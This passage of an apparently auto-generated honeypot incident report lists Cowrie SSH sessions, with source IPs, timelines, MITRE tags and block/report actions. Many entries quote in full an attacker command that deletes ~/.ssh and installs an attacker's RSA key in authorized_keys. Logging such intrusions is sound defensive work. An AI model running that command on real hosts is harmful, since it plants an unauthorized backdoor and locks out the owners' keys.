| `2026-04-20 20:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7365679ed85c

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:03 |
| **Last Seen** | 2026-04-20 20:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:03:35` | `cowrie.session.connect` |
| `2026-04-20 20:03:35` | `cowrie.client.version` |
| `2026-04-20 20:03:35` | `cowrie.client.kex` |
| `2026-04-20 20:03:36` | `cowrie.login.success` |
| `2026-04-20 20:03:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a9bb9eafe91

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:03 |
| **Last Seen** | 2026-04-20 20:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:03:40` | `cowrie.session.connect` |
| `2026-04-20 20:03:40` | `cowrie.client.version` |
| `2026-04-20 20:03:40` | `cowrie.client.kex` |
| `2026-04-20 20:03:41` | `cowrie.login.success` |
| `2026-04-20 20:03:41` | `cowrie.session.params` |
| `2026-04-20 20:03:41` | `cowrie.command.input` |
| `2026-04-20 20:03:41` | `cowrie.command.failed` |
| `2026-04-20 20:03:42` | `cowrie.log.closed` |
| `2026-04-20 20:03:42` | `cowrie.session.params` |
| `2026-04-20 20:03:42` | `cowrie.command.input` |
| `2026-04-20 20:03:42` | `cowrie.session.file_download` |
| `2026-04-20 20:03:42` | `cowrie.log.closed` |
| `2026-04-20 20:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7d07b32fa27

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:03 |
| **Last Seen** | 2026-04-20 20:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:03:45` | `cowrie.session.connect` |
| `2026-04-20 20:03:45` | `cowrie.client.version` |
| `2026-04-20 20:03:46` | `cowrie.client.kex` |
| `2026-04-20 20:03:47` | `cowrie.login.success` |
| `2026-04-20 20:03:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd49affad7f

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:03 |
| **Last Seen** | 2026-04-20 20:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:03:55` | `cowrie.session.connect` |
| `2026-04-20 20:03:55` | `cowrie.client.version` |
| `2026-04-20 20:03:55` | `cowrie.client.kex` |
| `2026-04-20 20:03:55` | `cowrie.login.success` |
| `2026-04-20 20:03:56` | `cowrie.session.params` |
| `2026-04-20 20:03:56` | `cowrie.command.input` |
| `2026-04-20 20:03:56` | `cowrie.command.failed` |
| `2026-04-20 20:03:56` | `cowrie.log.closed` |
| `2026-04-20 20:03:56` | `cowrie.session.params` |
| `2026-04-20 20:03:56` | `cowrie.command.input` |
| `2026-04-20 20:03:56` | `cowrie.session.file_download` |
| `2026-04-20 20:03:56` | `cowrie.log.closed` |
| `2026-04-20 20:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47c1f7d7f8d9

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:03 |
| **Last Seen** | 2026-04-20 20:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:03:58` | `cowrie.session.connect` |
| `2026-04-20 20:03:58` | `cowrie.client.version` |
| `2026-04-20 20:03:58` | `cowrie.client.kex` |
| `2026-04-20 20:03:59` | `cowrie.login.success` |
| `2026-04-20 20:03:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `46.253.45[.]10` to AbuseIPDB if not already reported
- [ ] Block `46.253.45[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8d078be68ee

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:04 |
| **Last Seen** | 2026-04-20 20:04 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:04:17` | `cowrie.session.connect` |
| `2026-04-20 20:04:17` | `cowrie.client.version` |
| `2026-04-20 20:04:17` | `cowrie.client.kex` |
| `2026-04-20 20:04:17` | `cowrie.login.success` |
| `2026-04-20 20:04:18` | `cowrie.session.params` |
| `2026-04-20 20:04:18` | `cowrie.command.input` |
| `2026-04-20 20:04:18` | `cowrie.command.failed` |
| `2026-04-20 20:04:18` | `cowrie.log.closed` |
| `2026-04-20 20:04:18` | `cowrie.session.params` |
| `2026-04-20 20:04:18` | `cowrie.command.input` |
| `2026-04-20 20:04:18` | `cowrie.session.file_download` |
| `2026-04-20 20:04:18` | `cowrie.log.closed` |
| `2026-04-20 20:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e4a82cd9307

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:04 |
| **Last Seen** | 2026-04-20 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:04:20` | `cowrie.session.connect` |
| `2026-04-20 20:04:20` | `cowrie.client.version` |
| `2026-04-20 20:04:21` | `cowrie.client.kex` |
| `2026-04-20 20:04:21` | `cowrie.login.success` |
| `2026-04-20 20:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa027f3eb0f1

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:04 |
| **Last Seen** | 2026-04-20 20:05 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:04:56` | `cowrie.session.connect` |
| `2026-04-20 20:04:56` | `cowrie.client.version` |
| `2026-04-20 20:04:56` | `cowrie.client.kex` |
| `2026-04-20 20:04:58` | `cowrie.login.success` |
| `2026-04-20 20:04:58` | `cowrie.session.params` |
| `2026-04-20 20:04:58` | `cowrie.command.input` |
| `2026-04-20 20:04:58` | `cowrie.command.failed` |
| `2026-04-20 20:04:59` | `cowrie.log.closed` |
| `2026-04-20 20:04:59` | `cowrie.session.params` |
| `2026-04-20 20:04:59` | `cowrie.command.input` |
| `2026-04-20 20:05:00` | `cowrie.session.file_download` |
| `2026-04-20 20:05:00` | `cowrie.log.closed` |
| `2026-04-20 20:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4557eaaf869c

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:04 |
| **Last Seen** | 2026-04-20 20:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:04:59` | `cowrie.session.connect` |
| `2026-04-20 20:04:59` | `cowrie.client.version` |
| `2026-04-20 20:04:59` | `cowrie.client.kex` |
| `2026-04-20 20:05:00` | `cowrie.login.success` |
| `2026-04-20 20:05:00` | `cowrie.session.params` |
| `2026-04-20 20:05:00` | `cowrie.command.input` |
| `2026-04-20 20:05:00` | `cowrie.command.failed` |
| `2026-04-20 20:05:00` | `cowrie.log.closed` |
| `2026-04-20 20:05:01` | `cowrie.session.params` |
| `2026-04-20 20:05:01` | `cowrie.command.input` |
| `2026-04-20 20:05:01` | `cowrie.session.file_download` |
| `2026-04-20 20:05:01` | `cowrie.log.closed` |
| `2026-04-20 20:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42b2ef26c8c1

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:05 |
| **Last Seen** | 2026-04-20 20:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:05:03` | `cowrie.session.connect` |
| `2026-04-20 20:05:03` | `cowrie.client.version` |
| `2026-04-20 20:05:03` | `cowrie.client.kex` |
| `2026-04-20 20:05:04` | `cowrie.login.success` |
| `2026-04-20 20:05:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55920228bc2d

| Field | Detail |
|---|---|
| **Source IP** | `186.219.184[.]142` |
| **First Seen** | 2026-04-20 20:05 |
| **Last Seen** | 2026-04-20 20:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:05:04` | `cowrie.session.connect` |
| `2026-04-20 20:05:04` | `cowrie.client.version` |
| `2026-04-20 20:05:04` | `cowrie.client.kex` |
| `2026-04-20 20:05:06` | `cowrie.login.success` |
| `2026-04-20 20:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.219.184[.]142` to AbuseIPDB if not already reported
- [ ] Block `186.219.184[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54ebd8630b0d

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:05 |
| **Last Seen** | 2026-04-20 20:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:05:13` | `cowrie.session.connect` |
| `2026-04-20 20:05:13` | `cowrie.client.version` |
| `2026-04-20 20:05:15` | `cowrie.client.kex` |
| `2026-04-20 20:05:15` | `cowrie.login.success` |
| `2026-04-20 20:05:15` | `cowrie.session.params` |
| `2026-04-20 20:05:15` | `cowrie.command.input` |
| `2026-04-20 20:05:15` | `cowrie.command.failed` |
| `2026-04-20 20:05:15` | `cowrie.log.closed` |
| `2026-04-20 20:05:16` | `cowrie.session.params` |
| `2026-04-20 20:05:16` | `cowrie.command.input` |
| `2026-04-20 20:05:16` | `cowrie.session.file_download` |
| `2026-04-20 20:05:16` | `cowrie.log.closed` |
| `2026-04-20 20:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afaf1d47c899

| Field | Detail |
|---|---|
| **Source IP** | `154.221.28[.]214` |
| **First Seen** | 2026-04-20 20:05 |
| **Last Seen** | 2026-04-20 20:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:05:17` | `cowrie.session.connect` |
| `2026-04-20 20:05:17` | `cowrie.client.version` |
| `2026-04-20 20:05:18` | `cowrie.client.kex` |
| `2026-04-20 20:05:18` | `cowrie.login.success` |
| `2026-04-20 20:05:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.221.28[.]214` to AbuseIPDB if not already reported
- [ ] Block `154.221.28[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28e5d36166fd

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:06 |
| **Last Seen** | 2026-04-20 20:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:06:21` | `cowrie.session.connect` |
| `2026-04-20 20:06:21` | `cowrie.client.version` |
| `2026-04-20 20:06:22` | `cowrie.client.kex` |
| `2026-04-20 20:06:22` | `cowrie.login.success` |
| `2026-04-20 20:06:22` | `cowrie.session.params` |
| `2026-04-20 20:06:22` | `cowrie.command.input` |
| `2026-04-20 20:06:22` | `cowrie.command.failed` |
| `2026-04-20 20:06:23` | `cowrie.log.closed` |
| `2026-04-20 20:06:23` | `cowrie.session.params` |
| `2026-04-20 20:06:23` | `cowrie.command.input` |
| `2026-04-20 20:06:23` | `cowrie.session.file_download` |
| `2026-04-20 20:06:23` | `cowrie.log.closed` |
| `2026-04-20 20:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa7cf01b46b6

| Field | Detail |
|---|---|
| **Source IP** | `13.81.183[.]28` |
| **First Seen** | 2026-04-20 20:06 |
| **Last Seen** | 2026-04-20 20:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:06:25` | `cowrie.session.connect` |
| `2026-04-20 20:06:25` | `cowrie.client.version` |
| `2026-04-20 20:06:25` | `cowrie.client.kex` |
| `2026-04-20 20:06:26` | `cowrie.login.success` |
| `2026-04-20 20:06:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `13.81.183[.]28` to AbuseIPDB if not already reported
- [ ] Block `13.81.183[.]28` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e78eaa0c66bc

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:06 |
| **Last Seen** | 2026-04-20 20:06 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:06:40` | `cowrie.session.connect` |
| `2026-04-20 20:06:40` | `cowrie.client.version` |
| `2026-04-20 20:06:41` | `cowrie.client.kex` |
| `2026-04-20 20:06:42` | `cowrie.login.success` |
| `2026-04-20 20:06:42` | `cowrie.session.params` |
| `2026-04-20 20:06:42` | `cowrie.command.input` |
| `2026-04-20 20:06:42` | `cowrie.command.failed` |
| `2026-04-20 20:06:42` | `cowrie.log.closed` |
| `2026-04-20 20:06:43` | `cowrie.session.params` |
| `2026-04-20 20:06:43` | `cowrie.command.input` |
| `2026-04-20 20:06:43` | `cowrie.session.file_download` |
| `2026-04-20 20:06:43` | `cowrie.log.closed` |
| `2026-04-20 20:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db17e7a9ddab

| Field | Detail |
|---|---|
| **Source IP** | `209.141.47[.]217` |
| **First Seen** | 2026-04-20 20:06 |
| **Last Seen** | 2026-04-20 20:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-20 20:06:46` | `cowrie.session.connect` |
| `2026-04-20 20:06:46` | `cowrie.client.version` |
| `2026-04-20 20:06:46` | `cowrie.client.kex` |
| `2026-04-20 20:06:47` | `cowrie.login.success` |
| `2026-04-20 20:06:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.141.47[.]217` to AbuseIPDB if not already reported
- [ ] Block `209.141.47[.]217` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd3723db9f7f

| Field | Detail |
|---|---|
| **Source IP** | `46.253.45[.]10` |
| **First Seen** | 2026-04-20 20:06 |
| **Last Seen** | 2026-04-20 20:07 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
